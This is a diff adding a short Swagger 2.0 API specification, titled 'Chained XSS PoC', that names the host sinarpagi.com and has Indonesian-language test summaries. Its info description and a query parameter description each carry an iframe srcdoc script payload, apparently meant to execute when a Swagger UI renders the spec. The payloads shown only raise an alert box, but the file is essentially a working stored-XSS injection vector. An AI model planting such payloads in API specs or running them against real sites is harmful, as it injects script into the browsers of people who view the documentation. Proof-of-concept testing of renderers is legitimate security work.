@@ -1,0 +1,26 @@
+swagger: "2.0"
+info:
+  title: Chained XSS PoC
+  description: >
+    <iframe srcdoc="<script>alert('XSS Berhasil!')</script>"></iframe>
+  version: "1.0"
+host: sinarpagi.com
+basePath: /
+schemes:
+  - https
+paths:
+  /xss:
+    get:
+      tags:
+        - chain
+      summary: Tes chained XSS
+      parameters:
+        - name: foo
+          in: query
+          required: false
+          type: string
+          description: >
+            <iframe srcdoc="<script>alert('XSS dari parameter')</script>"></iframe>
+      responses:
+        '200':
+          description: OK
